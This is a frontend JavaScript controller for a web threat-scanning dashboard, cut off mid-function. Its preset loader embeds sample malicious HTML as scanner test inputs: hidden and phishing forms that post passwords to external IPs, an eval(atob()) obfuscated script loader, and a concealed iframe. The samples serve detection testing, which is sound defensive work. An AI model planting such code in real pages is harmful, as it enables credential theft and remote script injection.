/**
 * SecuNexis — Web Threat Detection & Security Analysis Platform
 * Enterprise SOC Frontend Controller, Analytics & Animation Engine (v2.1)
 */

// ================= ENVIRONMENT-ADAPTIVE API CONFIGURATION =================
// - When running on Render or any standard web server (HTTP/HTTPS): uses same-origin relative paths ("")
// - When opened as a local standalone file (file://): defaults to "http://localhost:3000"
const API_BASE = (typeof window !== "undefined" && (window.location.protocol === "http:" || window.location.protocol === "https:"))
  ? ""
  : "http://localhost:3000";

// Global Chart & Library Instances
let threatChartInstance = null;
let activityChartInstance = null;
let activityChartMeta = [];
let lastRenderedScanData = null;
let activeEvidenceCategory = "ALL";
let cachedEvidenceEntries = [];
let lenisInstance = null;
let scanLaserTween = null;
let scanStageInterval = null;

let currentHistoryFilter = "ALL";
let currentScanMode = "url";

// Register Chart.js custom radial tooltip positioner so donut tooltips never cover center total
function registerDonutTooltipPositioner() {
  if (typeof Chart !== "undefined" && Chart.Tooltip && Chart.Tooltip.positioners && !Chart.Tooltip.positioners.donutOutside) {
    Chart.Tooltip.positioners.donutOutside = function(items) {
      if (!items || !items.length) return false;
      const chart = this.chart;
      const el = items[0].element;
      if (!el || !chart.chartArea) return { x: 0, y: 0 };

      const centerX = (chart.chartArea.left + chart.chartArea.right) / 2;
      const centerY = (chart.chartArea.top + chart.chartArea.bottom) / 2;
      const angle = (typeof el.startAngle === "number" && typeof el.endAngle === "number")
        ? (el.startAngle + el.endAngle) / 2
        : 0;
      const radius = (el.outerRadius || 65) + 12;

      return {
        x: Math.round(centerX + Math.cos(angle) * radius),
        y: Math.round(centerY + Math.sin(angle) * radius)
      };
    };
  }
}

// ================= HELPER: ELEGANT ALERTS (SWEETALERT2) =================
function showSocAlert({ icon = "info", title = "Notice", text = "" }) {
  if (typeof Swal !== "undefined") {
    return Swal.fire({
      icon,
      title,
      text,
      confirmButtonText: "Acknowledge",
      background: "#111B2D",
      color: "#F8FAFC",
      confirmButtonColor: "#00B8F0"
    });
  } else {
    alert(`${title}\n\n${text}`);
    return Promise.resolve();
  }
}

async function showSocConfirm({ title = "Confirm Action", text = "", confirmText = "Confirm" }) {
  if (typeof Swal !== "undefined") {
    const res = await Swal.fire({
      icon: "warning",
      title,
      text,
      showCancelButton: true,
      confirmButtonText: confirmText,
      cancelButtonText: "Cancel",
      background: "#111B2D",
      color: "#F8FAFC",
      confirmButtonColor: "#EF4444",
      cancelButtonColor: "#1E293B"
    });
    return res.isConfirmed;
  } else {
    return confirm(text || title);
  }
}

function refreshIcons() {
  if (typeof lucide !== "undefined" && typeof lucide.createIcons === "function") {
    lucide.createIcons();
  }
}

// ================= INITIALIZATION =================
window.onload = () => {
  // Initialize Lucide icons
  refreshIcons();

  // Register custom Chart.js radial tooltip positioner
  registerDonutTooltipPositioner();

  // Initialize Lenis smooth scrolling
  initSmoothScroll();

  // Keep charts responsive across viewport resizes
  window.addEventListener("resize", () => {
    if (threatChartInstance) threatChartInstance.resize();
    if (activityChartInstance) activityChartInstance.resize();
  });

  // Hash-based navigation or default to dashboard
  const initialHash = window.location.hash.replace("#", "") || "dashboard";
  if (["dashboard", "scanner", "history", "reports", "settings", "alerts", "incidents", "audit", "users"].includes(initialHash)) {
    window.__pendingInitialView = initialHash;
  } else {
    window.__pendingInitialView = "dashboard";
  }

  // Initialize Enterprise SOC Timeline Controls
  initSocTimelineControls();

  // Dynamic API Host display in Settings view
  const configHostEl = document.getElementById("configApiHost");
  if (configHostEl) {
    configHostEl.textContent = API_BASE ? `${API_BASE} (Standalone)` : `${window.location.origin || "Same-Origin"} (/api)`;
  }

  // Hide download button initially
  const downloadBtn = document.getElementById("downloadBtn");
  if (downloadBtn) downloadBtn.style.display = "none";

  // Gate console behind server-verified authentication session
  initSocAuthGate();

  // Entrance stagger animation via GSAP
  animateInitialEntrance();

  // Linear-style Cmd/Ctrl+K shortcut to jump to New Scan
  document.addEventListener("keydown", (e) => {
    if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === "k") {
      e.preventDefault();
      switchView("scanner");
      const inputEl = document.getElementById("inputData");
      if (inputEl) inputEl.focus();
    }
  });
};

function initSmoothScroll() {
  if (typeof Lenis !== "undefined") {
    lenisInstance = new Lenis({
      duration: 1.05,
      easing: (t) => Math.min(1, 1.001 - Math.pow(2, -10 * t)),
      smoothWheel: true,
      wheelMultiplier: 0.95
    });

    function raf(time) {
      lenisInstance.raf(time);
      requestAnimationFrame(raf);
    }
    requestAnimationFrame(raf);
  }
}

function animateInitialEntrance() {
  if (typeof gsap === "undefined") return;

  gsap.from(".sidebar", {
    x: -16,
    opacity: 0,
    duration: 0.45,
    ease: "power2.out",
    clearProps: "transform,opacity"
  });

  gsap.from("#view-dashboard .stat-card", {
    y: 14,
    opacity: 0,
    duration: 0.45,
    stagger: 0.06,
    ease: "power2.out",
    clearProps: "transform,opacity"
  });
}

// ================= VIEW NAVIGATION =================
function switchView(viewName, animate = true) {
  const navItems = document.querySelectorAll(".nav-item");
  navItems.forEach(item => {
    if (item.getAttribute("data-view") === viewName) {
      item.classList.add("active");
    } else {
      item.classList.remove("active");
    }
  });

  const viewSections = document.querySelectorAll(".view-section");
  let targetSection = null;
  viewSections.forEach(section => {
    if (section.id === `view-${viewName}`) {
      section.classList.add("active");
      targetSection = section;
    } else {
      section.classList.remove("active");
    }
  });

  // Update Topbar breadcrumb & titles
  const titleEl = document.getElementById("pageTitle");
  const subEl = document.getElementById("pageSubtitle");
  const crumbEl = document.getElementById("pageBreadcrumb");

  const pageMeta = {
    dashboard: {
      crumb: "OVERVIEW",
      title: "Security Operations Dashboard",
      subtitle: "Real-time threat intelligence, DOM inspection, and session telemetry"
    },
    scanner: {
      crumb: "TARGET SCANNER",
      title: "Target Threat Scanner",
      subtitle: "Context-aware static DOM inspection and VirusTotal v3 reputation analysis"
    },
    history: {
      crumb: "AUDIT LOG",
      title: "Detection Audit Log",
      subtitle: "Comprehensive session history of completed security evaluations"
    },
    reports: {
      crumb: "REPORTS",
      title: "Threat & Compliance Reports",
      subtitle: "Automated executive reporting and continuous incident notification center"
    },
    settings: {
      crumb: "CONFIGURATION",
      title: "Detection Engine Configuration",
      subtitle: "Heuristic thresholds, calibration policies, and API integration parameters"
    },
    alerts: {
      crumb: "SOC ALERTS",
      title: "Security Alert Management",
      subtitle: "Real-time actionable threat alerts, triage queue, and escalation workflows"
    },
    incidents: {
      crumb: "INCIDENT CONSOLE",
      title: "Security Incident Response Console",
      subtitle: "Correlated attack campaigns, threat containment, and investigation notes"
    },
    audit: {
      crumb: "IMMUTABLE AUDIT",
      title: "Security Audit Trail",
      subtitle: "Append-only SHA-256 chained record of authentication, RBAC, alert, and incident operations"
    },
    users: {
      crumb: "ACCESS CONTROL",
      title: "SOC User & Role Management",
      subtitle: "Provision accounts, assign ADMIN / ANALYST / VIEWER roles, and manage lockouts"
    }
  };

  // Client-side UX guard (strictly backed by server-side RBAC)
  if (viewName === "users" && socCurrentUser && socCurrentUser.role !== "ADMIN") {
    showSocAlert({ icon: "error", title: "Access Denied", text: "User & RBAC management requires the ADMIN role." });
    return switchView("dashboard", animate);
  }
  if (viewName === "audit" && socCurrentUser && !["ADMIN", "ANALYST"].includes(socCurrentUser.role)) {
    showSocAlert({ icon: "error", title: "Access Denied", text: "Audit Trail access requires ADMIN or ANALYST permissions." });
    return switchView("dashboard", animate);
  }

  if (pageMeta[viewName]) {
    if (crumbEl) crumbEl.innerText = pageMeta[viewName].crumb;
    if (titleEl) titleEl.innerText = pageMeta[viewName].title;
    if (subEl) subEl.innerText = pageMeta[viewName].subtitle;
  }

  // Update URL hash safely without scroll jump
  if (history.replaceState) {
    history.replaceState(null, null, `#${viewName}`);
  }

  // Close mobile sidebar if open
  toggleSidebar(false);

  // Scroll to top smoothly
  if (lenisInstance) {
    lenisInstance.scrollTo(0, { immediate: true });
    lenisInstance.resize();
  } else {
    window.scrollTo(0, 0);
  }

  // Animate incoming view smoothly via GSAP
  if (animate && targetSection && typeof gsap !== "undefined") {
    gsap.fromTo(
      targetSection,
      { opacity: 0, y: 10 },
      { opacity: 1, y: 0, duration: 0.3, ease: "power2.out", clearProps: "transform,opacity" }
    );
  }

  // Refresh relevant view data (only when authenticated)
  if (socCurrentUser) {
    if (viewName === "dashboard" || viewName === "history") {
      refreshAllDashboardData();
    }

    if (viewName === "alerts") {
      fetchSocAlerts(1);
      fetchSocAlertStats();
    }

    if (viewName === "incidents") {
      fetchSocIncidents(1);
      fetchSocIncidentStats();
    }

    if (viewName === "audit") {
      fetchSocAuditLogs(1);
    }

    if (viewName === "users") {
      fetchSocUsers();
    }
  }

  if (viewName === "dashboard") {
    requestAnimationFrame(() => {
      if (threatChartInstance) threatChartInstance.resize();
      if (activityChartInstance) activityChartInstance.resize();
    });
  }

  refreshIcons();
}

// Mobile sidebar toggle
function toggleSidebar(open) {
  const sidebar = document.getElementById("sidebar");
  const overlay = document.getElementById("sidebarOverlay");
  if (sidebar && overlay) {
    if (open) {
      sidebar.classList.add("open");
      overlay.classList.add("active");
    } else {
      sidebar.classList.remove("open");
      overlay.classList.remove("active");
    }
  }
}

// ================= SCANNER MODE TOGGLING =================
function setScanMode(mode) {
  currentScanMode = mode;
  const urlBtn = document.getElementById("modeUrlBtn");
  const htmlBtn = document.getElementById("modeHtmlBtn");
  const inputEl = document.getElementById("inputData");
  const instructionEl = document.getElementById("instructionsText");

  if (mode === "url") {
    if (urlBtn) urlBtn.classList.add("active");
    if (htmlBtn) htmlBtn.classList.remove("active");
    if (inputEl) {
      inputEl.placeholder = "Enter target website URL (e.g. https://github.com or https://google.com)";
      inputEl.rows = 3;
    }
    if (instructionEl) {
      instructionEl.innerHTML = "Enter a fully qualified URL (starting with <code>http://</code> or <code>https://</code>). The system will fetch and analyze DOM structure, embedded scripts, and check VirusTotal threat database.";
    }
  } else {
    if (htmlBtn) htmlBtn.classList.add("active");
    if (urlBtn) urlBtn.classList.remove("active");
    if (inputEl) {
      inputEl.placeholder = "Paste raw HTML source code or markup here (e.g. <html><head>...</head><body>...</body></html>)...";
      inputEl.rows = 6;
    }
    if (instructionEl) {
      instructionEl.innerHTML = "Paste raw HTML source code. The scanner performs comprehensive static DOM inspection, obfuscation checks, and hidden element analysis without fetching external URLs.";
    }
  }
}

// Quick presets loader
function loadPreset(type) {
  const inputEl = document.getElementById("inputData");
  if (!inputEl) return;

  switch (type) {
    case "github":
      setScanMode("url");
      inputEl.value = "https://github.com";
      break;
    case "google":
      setScanMode("url");
      inputEl.value = "https://google.com";
      break;
    case "hidden_pass":
      setScanMode("html");
      inputEl.value = `<!DOCTYPE html>
<html>
<head><title>Account Portal</title></head>
<body>
  <h2>Welcome to Customer Support</h2>
  <!-- Hidden form stealing user credentials silently -->
  <form action="http://192.168.1.100/harvest" method="POST" style="display:none; visibility:hidden; opacity:0;">
    <input type="text" name="username" value="" />
    <input type="password" name="password" value="" />
  </form>
  <p>Please browse our help documentation.</p>
</body>
</html>`;
      break;
    case "phishing":
      setScanMode("html");
      inputEl.value = `<!DOCTYPE html>
<html>
<head><title>Urgent Security Verification</title></head>
<body>
  <div class="alert">
    <h2>Security Alert: Account Suspended Immediately</h2>
    <p>Unauthorized activity detected on your wallet. Enter password now to claim your refund.</p>
  </div>
  <form action="http://185.220.101.5/collect.php" method="POST">
    <input type="text" name="email" placeholder="Account Email" />
    <input type="password" name="password" placeholder="Current Password" />
    <button type="submit">Verify Now</button>
  </form>
</body>
</html>`;
      break;
    case "eval":
      setScanMode("html");
      inputEl.value = `<!DOCTYPE html>
<html>
<head><title>Performance Optimizer</title></head>
<body>
  <script>
    // Obfuscated payload disguised via eval + atob dynamic decoding
    const encodedPayload = "ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSdodHRwOi8vNDUuMzMuMzIuMTU2L3hzczEuanMnPjwvc2NyaXB0PiIpOw==";
    eval(atob(encodedPayload));
  </script>
</body>
</html>`;
      break;
    case "iframe":
      setScanMode("html");
      inputEl.value = `<!DOCTYPE html>
<html>
<head><title>Company News</title></head>
<body>
  <h1>Corporate Announcements</h1>
  <p>Read our quarterly investor updates below.</p>
  <!-- Concealed zero-dimension external frame for silent clickjacking -->
  <iframe src="http://malicious-external-tracker.org/exploit" width="0" height="0" style="display:none;"></iframe>
</body>
</html>`;
      break;
  }

  switchView("scanner");
  inputEl.focus();
}

// Quick Target Inspector state helper
function setQuickInspectorState(isBusy, statusMsg = "") {
  const quickBtn = document.getElementById("quickScanBtn");
  const quickBtnText = document.getElementById("quickScanBtnText");
  const quickStatus = document.getElementById("quickScanStatus");
  const quickStatusText = document.getElementById("quickStatusText");
  const quickInput = document.getElementById("quickInput");

  if (quickBtn) quickBtn.disabled = isBusy;
  if (quickInput) quickInput.disabled = isBusy;
  if (quickBtnText) quickBtnText.innerText = isBusy ? "Scanning..." : "Inspect";

  if (quickStatus) {
    quickStatus.style.display = isBusy ? "flex" : "none";
  }
  if (quickStatusText && statusMsg) {
    quickStatusText.textContent = statusMsg;
  }
}

// Quick scan from Dashboard widget
function handleQuickScan() {
  const quickInput = document.getElementById("quickInput");
  const target = quickInput ? quickInput.value.trim() : "";

  if (!target) {
    if (quickInput) quickInput.focus();
    showSocAlert({
      icon: "warning",
      title: "Target Input Required",
      text: "Please enter a valid website URL or paste an HTML snippet to inspect."
    });
    return;
  }

  const isHtmlSnippet =
    target.includes("<html") ||
    target.includes("<script") ||
    target.includes("<div") ||
    target.includes("<iframe") ||
    target.includes("<body") ||
    target.includes("<form") ||
    target.includes("<!DOCTYPE");

  const normalizedTarget = (!target.startsWith("http://") && !target.startsWith("https://") && !isHtmlSnippet && target.includes(".") && !target.includes("<"))
    ? `https://${target}`
    : target;

  const inputEl = document.getElementById("inputData");
  if (inputEl) {
    inputEl.value = normalizedTarget;
  }

  if (normalizedTarget.startsWith("http://") || normalizedTarget.startsWith("https://")) {
    setScanMode("url");
  } else {
    setScanMode("html");
  }

  // Show intuitive scanning feedback in Quick Inspector before handing off
  const displayLabel = normalizedTarget.length > 42 ? normalizedTarget.slice(0, 42) + "..." : normalizedTarget;
  setQuickInspectorState(true, `Dispatching "${displayLabel}" to SOC inspection pipeline...`);
  refreshIcons();

  setTimeout(() => {
    switchView("scanner");
    scan();
  }, 260);
}

// ================= TACTICAL SCANNING ANIMATION (GSAP) =================
function startScanAnimation(isUrlMode) {
  const loading = document.getElementById("loading");
  const laser = document.querySelector(".scan-laser-line");
  const stageDom = document.getElementById("stageDom");
  const stageJs = document.getElementById("stageJs");
  const stageVt = document.getElementById("stageVt");
  const stageRisk = document.getElementById("stageRisk");
  const loadingStage = document.getElementById("loadingStage");

  if (!loading) return;
  loading.style.display = "flex";

  // Reset stage pills
  [stageDom, stageJs, stageVt, stageRisk].forEach(el => {
    if (el) el.classList.remove("active", "done");
  });

  if (stageDom) stageDom.classList.add("active");
  if (loadingStage) {
    loadingStage.innerText = isUrlMode
      ? "Fetching remote target DOM and initializing heuristic parser..."
      : "Parsing raw HTML DOM tree and inspecting embedded elements...";
  }

  if (typeof gsap !== "undefined") {
    gsap.fromTo(loading, { opacity: 0, y: 8 }, { opacity: 1, y: 0, duration: 0.25, ease: "power2.out" });
    if (laser) {
      if (scanLaserTween) scanLaserTween.kill();
      scanLaserTween = gsap.fromTo(
        laser,
        { left: "-5%" },
        { left: "105%", duration: 1.5, repeat: -1, ease: "sine.inOut" }
      );
    }
  }

  let step = 0;
  if (scanStageInterval) clearInterval(scanStageInterval);
  scanStageInterval = setInterval(() => {
    step++;
    if (step === 1) {
      if (stageDom) { stageDom.classList.remove("active"); stageDom.classList.add("done"); }
      if (stageJs) stageJs.classList.add("active");
      if (loadingStage) loadingStage.innerText = "Scanning script tags for obfuscation, keyloggers & dynamic injection...";
    } else if (step === 2) {
      if (stageJs) { stageJs.classList.remove("active"); stageJs.classList.add("done"); }
      if (stageVt) stageVt.classList.add("active");
      if (loadingStage) {
        loadingStage.innerText = isUrlMode
          ? "Querying VirusTotal v3 reputation intelligence feeds..."
          : "Evaluating cross-domain credential targets and phishing lures...";
      }
    } else if (step >= 3) {
      if (stageVt) { stageVt.classList.remove("active"); stageVt.classList.add("done"); }
      if (stageRisk) stageRisk.classList.add("active");
      if (loadingStage) loadingStage.innerText = "Aggregating evidence-based risk score and verdict...";
    }
  }, 550);
}

function stopScanAnimation() {
  const loading = document.getElementById("loading");
  if (scanLaserTween) {
    scanLaserTween.kill();
    scanLaserTween = null;
  }
  if (scanStageInterval) {
    clearInterval(scanStageInterval);
    scanStageInterval = null;
  }
  if (loading) loading.style.display = "none";
}

// ================= PRIMARY SCAN LOGIC =================
async function scan() {
  const scanBtn = document.getElementById("scanBtn");
  const resultDiv = document.getElementById("result");
  const inputField = document.getElementById("inputData");

  const input = inputField ? inputField.value.trim() : "";

  if (!input) {
    showSocAlert({
      icon: "warning",
      title: "Input Required",
      text: "Please enter a website URL or HTML source code before launching a scan."
    });
    return;
  }

  // Detect input type
  let bodyData = {};
  let targetLabel = "";

  const looksLikeHtml = /<(html|head|body|script|div|iframe|form|meta|p|span|a|input|!doctype)\b/i.test(input);

  if (input.startsWith("http://") || input.startsWith("https://")) {
    try {
      const parsed = new URL(input);
      if (!parsed.hostname) throw new Error("Missing host");
      bodyData.url = parsed.href;
      targetLabel = parsed.href;
    } catch (_) {
      showSocAlert({
        icon: "error",
        title: "Invalid URL Format",
        text: "Please enter a properly formatted URL (for example, https://example.com)."
      });
      return;
    }
  } else if (looksLikeHtml) {
    bodyData.html = input;
    targetLabel = "HTML Source (" + (input.length > 36 ? input.slice(0, 36).replace(/\s+/g, " ") + "..." : input) + ")";
  } else if (input.includes(".") && !input.includes("<") && !/\s/.test(input)) {
    try {
      const parsed = new URL("https://" + input);
      bodyData.url = parsed.href;
      targetLabel = parsed.href;
      if (inputField) inputField.value = bodyData.url;
    } catch (_) {
      showSocAlert({
        icon: "error",
        title: "Invalid Target Input",
        text: "Please provide a valid URL (e.g. https://example.com) or valid HTML markup."
      });
      return;
    }
  } else {
    showSocAlert({
      icon: "error",
      title: "Invalid Target Input",
      text: "Please provide a valid URL (e.g. https://example.com) or valid HTML markup."
    });
    return;
  }

  // Start Tactical Scanning UI
  startScanAnimation(Boolean(bodyData.url));
  if (scanBtn) {
    scanBtn.disabled = true;
    scanBtn.classList.add("loading-active");
    const scanSpan = scanBtn.querySelector("span");
    if (scanSpan) scanSpan.innerText = "Scanning...";
  }
  if (resultDiv) resultDiv.style.display = "none";

  try {
    const response = await fetch(`${API_BASE}/scan`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(bodyData)
    });

    const data = await response.json();

    if (!response.ok || !data.risk || !data.analysis) {
      showSocAlert({
        icon: "error",
        title: "Scan Failed",
        text: data.error || "Invalid response received from detection backend."
      });
      return;
    }

    const scanTimestamp = new Date().toLocaleString();

    // Populate Results UI safely
    renderScanResult(targetLabel, data, { rawInput: input, timestamp: scanTimestamp });

    // Save history with full audit details
    saveToHistory(targetLabel, data.risk.severity || "LOW", data, input, scanTimestamp);

    // Refresh all history & dashboard statistics
    refreshAllDashboardData();

  } catch (err) {
    const endpointHint = API_BASE || (typeof window !== "undefined" ? window.location.origin : "");
    showSocAlert({
      icon: "error",
      title: "Backend Connection Error",
      text: `Could not reach detection engine (${endpointHint || "API service"}). Please verify backend service availability.`
    });
    console.error("Scan fetch error:", err);
  } finally {
    stopScanAnimation();
    setQuickInspectorState(false);
    if (scanBtn) {
      scanBtn.disabled = false;
      scanBtn.classList.remove("loading-active");
      const scanSpan = scanBtn.querySelector("span");
      if (scanSpan) scanSpan.innerText = "Scan Website";
    }
  }
}

// ================= REPORT ACTIONS =================
function copyTargetUrl() {
  const targetVal = lastRenderedScanData?.target || document.getElementById("resultTargetValue")?.textContent || "";
  if (!targetVal) return;

  const btn = document.getElementById("copyTargetBtn");
  const markCopied = () => {
    if (!btn) return;
    btn.innerHTML = `<i data-lucide="check" class="icon-12"></i><span>Copied</span>`;
    refreshIcons();
    setTimeout(() => {
      btn.innerHTML = `<i data-lucide="copy" class="icon-12"></i><span>Copy Target</span>`;
      refreshIcons();
    }, 1600);
  };

  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(targetVal).then(markCopied).catch(() => {
      showSocAlert({ icon: "info", title: "Target Input", text: targetVal });
    });
  } else {
    showSocAlert({ icon: "info", title: "Target Input", text: targetVal });
  }
}

function rescanCurrentTarget() {
  const inputField = document.getElementById("inputData");
  const target = lastRenderedScanData?.target || "";
  const rawInput = lastRenderedScanData?.rawInput || "";

  if (!target && !rawInput) {
    showSocAlert({
      icon: "info",
      title: "No Target Loaded",
      text: "Execute or open a scan result first before rescanning."
    });
    return;
  }

  if (target.startsWith("http://") || target.startsWith("https://")) {
    setScanMode("url");
    if (inputField) inputField.value = target;
    scan();
    return;
  }

  if (rawInput) {
    setScanMode("html");
    if (inputField) inputField.value = rawInput;
    scan();
    return;
  }

  setScanMode("html");
  showSocAlert({
    icon: "info",
    title: "HTML Source Required",
    text: "This historical record only stored summary metadata for a raw HTML snippet. Paste the HTML source into the editor to run a fresh scan."
  });
}

function exportPdfReport() {
  const resultDiv = document.getElementById("result");
  if (!resultDiv || resultDiv.style.display === "none") {
    showSocAlert({
      icon: "info",
      title: "No Report Available",
      text: "Execute or open a scan result before exporting a PDF brief."
    });
    return;
  }
  window.print();
}

// ================= RENDER SCAN RESULTS =================
function renderScanResult(targetLabel, data, options = {}) {
  const resultDiv = document.getElementById("result");
  const downloadBtn = document.getElementById("downloadBtn");

  if (!resultDiv) return;

  const safeAnalysis = data?.analysis || {};
  const safeRisk = data?.risk || {};
  const safeVt = data?.virusTotal || null;
  const timestamp = options.timestamp || new Date().toLocaleString();

  lastRenderedScanData = {
    target: targetLabel,
    rawInput: options.rawInput || "",
    timestamp,
    data: {
      analysis: safeAnalysis,
      risk: safeRisk,
      virusTotal: safeVt
    }
  };

  resultDiv.style.display = "block";
  if (downloadBtn) downloadBtn.style.display = "inline-flex";

  // Target info (XSS-safe textContent)
  const isUrlTarget = typeof targetLabel === "string" && (targetLabel.startsWith("http://") || targetLabel.startsWith("https://"));
  const targetValEl = document.getElementById("resultTargetValue");
  const targetTypeEl = document.getElementById("resultTargetType");
  const heroTargetMeta = document.getElementById("heroTargetMeta");
  if (targetValEl) targetValEl.textContent = targetLabel || "Unknown Target";
  if (targetTypeEl) targetTypeEl.textContent = isUrlTarget ? "URL" : "HTML";
  if (heroTargetMeta) {
    heroTargetMeta.textContent = targetLabel || "Unknown Target";
    heroTargetMeta.title = targetLabel || "";
  }

  // Timestamp
  const scanTimeEl = document.getElementById("scanTime");
  if (scanTimeEl) scanTimeEl.textContent = timestamp;

  // 1. EXECUTIVE SECURITY VERDICT (SAFE, SUSPICIOUS, MALICIOUS, INCONCLUSIVE)
  const verdictRaw = String(safeRisk.verdict || "SAFE").toUpperCase();
  const verdict = ["SAFE", "SUSPICIOUS", "MALICIOUS", "INCONCLUSIVE"].includes(verdictRaw)
    ? verdictRaw
    : "INCONCLUSIVE";
  const verdictKey = verdict.toLowerCase();

  const verdictHeroCard = document.getElementById("verdictKpiCard");
  if (verdictHeroCard) {
    verdictHeroCard.className = `verdict-hero verdict-${verdictKey}`;
  }

  const verdictEl = document.getElementById("securityVerdict");
  const verdictIcon = document.getElementById("severityIcon");
  const verdictPolicyBadge = document.getElementById("verdictPolicyBadge");
  const verdictDesc = document.getElementById("verdictDesc");

  if (verdictEl) {
    verdictEl.textContent = verdict;
    verdictEl.className = "verdict-text " + verdictKey;
  }

  if (verdictIcon) {
    verdictIcon.textContent =
      verdict === "SAFE" ? "✅" :
      verdict === "SUSPICIOUS" ? "⚠️" :
      verdict === "MALICIOUS" ? "🚨" : "❓";
  }

  if (verdictPolicyBadge) {
    verdictPolicyBadge.className = `verdict-policy-pill ${verdictKey}`;
    verdictPolicyBadge.textContent =
      verdict === "SAFE" ? "VERIFIED BASELINE" :
      verdict === "SUSPICIOUS" ? "ANOMALIES DETECTED" :
      verdict === "MALICIOUS" ? "HIGH-CONFIDENCE THREAT" : "INSUFFICIENT COVERAGE";
  }

  if (verdictDesc) {
    if (verdict === "SAFE") {
      verdictDesc.textContent = "Safe: No significant malicious threat indicators found across inspected payload and available intelligence.";
    } else if (verdict === "SUSPICIOUS") {
      verdictDesc.textContent = "Suspicious: Credible anomaly or moderate threat indicators detected; analyst inspection advised.";
    } else if (verdict === "MALICIOUS") {
      verdictDesc.textContent = "Malicious: Confirmed malicious blacklist detections or high-confidence attack infrastructure identified.";
    } else {
      verdictDesc.textContent = "Inconclusive: Target payload was empty or lacked parseable HTML structure for reliable classification.";
    }
  }

  // 2. RISK SEVERITY & COMPOSITE SCORE (0 - 100) + CIRCULAR GAUGE
  const severity = String(safeRisk.severity || "LOW").toUpperCase();
  const severityKey = ["LOW", "MEDIUM", "HIGH"].includes(severity) ? severity.toLowerCase() : "low";
  const riskScore = typeof safeRisk.riskScore === "number" ? safeRisk.riskScore : 0;

  const severityEl = document.getElementById("severity");
  const heroSeverityMeta = document.getElementById("heroSeverityMeta");
  const heroScoreMeta = document.getElementById("heroScoreMeta");

  if (severityEl) {
    severityEl.textContent = severity;
    severityEl.className = "status-badge " + severityKey;
  }
  if (heroSeverityMeta) heroSeverityMeta.textContent = severity;
  if (heroScoreMeta) heroScoreMeta.textContent = `${riskScore} / 100`;

  const riskScoreEl = document.getElementById("riskScore");
  if (riskScoreEl) {
    if (typeof gsap !== "undefined") {
      const counter = { val: 0 };
      gsap.to(counter, {
        val: riskScore,
        duration: 0.65,
        ease: "power2.out",
        onUpdate: () => {
          riskScoreEl.textContent = Math.round(counter.val);
        }
      });
    } else {
      riskScoreEl.textContent = riskScore;
    }
  }

  const pct = Math.min(100, Math.max(0, riskScore));
  const progressBar = document.getElementById("riskScoreProgressBar");
  if (progressBar) {
    progressBar.style.width = `${pct}%`;
    progressBar.className = "risk-bar-fill " + severityKey;
  }

  const gaugeArc = document.getElementById("riskGaugeArc");
  if (gaugeArc) {
    const circumference = 2 * Math.PI * 54;
    const offset = circumference * (1 - pct / 100);
    gaugeArc.setAttribute("stroke-dasharray", circumference.toFixed(3));
    gaugeArc.setAttribute("stroke-dashoffset", offset.toFixed(3));
    gaugeArc.className.baseVal = `risk-gauge-arc ${severityKey}`;
  }

  const scoredThreats = Array.isArray(safeRisk.scoredThreats) ? safeRisk.scoredThreats : [];
  const factorsNote = document.getElementById("riskFactorsSummary");
  if (factorsNote) {
    if (verdict === "INCONCLUSIVE") {
      factorsNote.textContent = "0 risk points assigned — target lacked sufficient inspectable DOM payload.";
    } else if (scoredThreats.length === 0) {
      factorsNote.textContent = "0 risk points assigned — informational observations contribute 0 risk points.";
    } else {
      factorsNote.textContent = `${scoredThreats.length} weighted threat signal${scoredThreats.length === 1 ? "" : "s"} contributing ${riskScore} / 100 points.`;
    }
  }

  // 3. SCAN COVERAGE & AUDIT COUNTS
  const coverage = safeRisk.scanCoverage || "FULL";
  const coverageBadge = document.getElementById("scanCoverageBadge");
  const coverageNote = document.getElementById("coverageNote");
  const metricThreatCount = document.getElementById("metricThreatCount");
  const metricInfoCount = document.getElementById("metricInfoCount");

  if (coverageBadge) {
    if (coverage === "FULL") {
      coverageBadge.textContent = "Full Inspection";
      coverageBadge.className = "coverage-pill full";
    } else if (coverage === "STATIC_ONLY") {
      coverageBadge.textContent = "Static Only (VT Unavailable)";
      coverageBadge.className = "coverage-pill partial";
    } else {
      coverageBadge.textContent = "Insufficient Coverage";
      coverageBadge.className = "coverage-pill insufficient";
    }
  }

  if (coverageNote) {
    coverageNote.textContent = safeRisk.coverageNote || "Static DOM and script heuristics verified.";
  }

  const findingsList = Array.isArray(safeRisk.evidenceFindings)
    ? safeRisk.evidenceFindings
    : (Array.isArray(safeAnalysis.findings) ? safeAnalysis.findings : []);
  const threatCount = typeof safeRisk.threatCount === "number"
    ? safeRisk.threatCount
    : scoredThreats.length;
  const infoCount = typeof safeRisk.infoCount === "number"
    ? safeRisk.infoCount
    : findingsList.filter(f => !f.isThreat).length;

  if (metricThreatCount) metricThreatCount.textContent = threatCount;
  if (metricInfoCount) metricInfoCount.textContent = infoCount;

  // 4. DEDICATED VIRUSTOTAL THREAT INTELLIGENCE SECTION
  renderVirusTotalIntelligence(safeVt);

  // 5. STATIC DOM ANALYSIS MATRIX
  renderStaticDomMatrix(safeAnalysis);

  // 6. RISK EXPLANATIONS
  const explanationUl = document.getElementById("riskExplanation");
  if (explanationUl) {
    explanationUl.innerHTML = "";
    const explanations = Array.isArray(safeRisk.explanation) && safeRisk.explanation.length > 0
      ? safeRisk.explanation
      : ["No major threat indicators or anomaly patterns were found during inspection."];

    explanations.forEach(text => {
      const li = document.createElement("li");
      const isDanger = verdict === "MALICIOUS";
      const isWarning = verdict === "SUSPICIOUS";
      const isSafe = verdict === "SAFE";

      li.className = `explanation-item ${isDanger ? "danger" : isWarning ? "warning" : isSafe ? "safe" : "info"}`;

      const iconSpan = document.createElement("span");
      iconSpan.className = "explanation-icon";
      iconSpan.textContent = isDanger ? "🚨" : isWarning ? "⚠️" : isSafe ? "✅" : "ℹ️";

      const textSpan = document.createElement("span");
      textSpan.textContent = String(text);

      li.appendChild(iconSpan);
      li.appendChild(textSpan);
      explanationUl.appendChild(li);
    });
  }

  // 7. RECOMMENDED REMEDIATION & ACTIONS
  renderRemediationPlaybook({ analysis: safeAnalysis, risk: safeRisk, virusTotal: safeVt });

  // 8. CATEGORIZED DETECTION EVIDENCE + SCORE BREAKDOWN
  activeEvidenceCategory = "ALL";
  renderScoreBreakdown(scoredThreats, riskScore);
  renderEvidenceFindings(findingsList, scoredThreats);

  // Highlight parameter violations in dashboard matrix if visible
  highlightSeverityViolations(data);

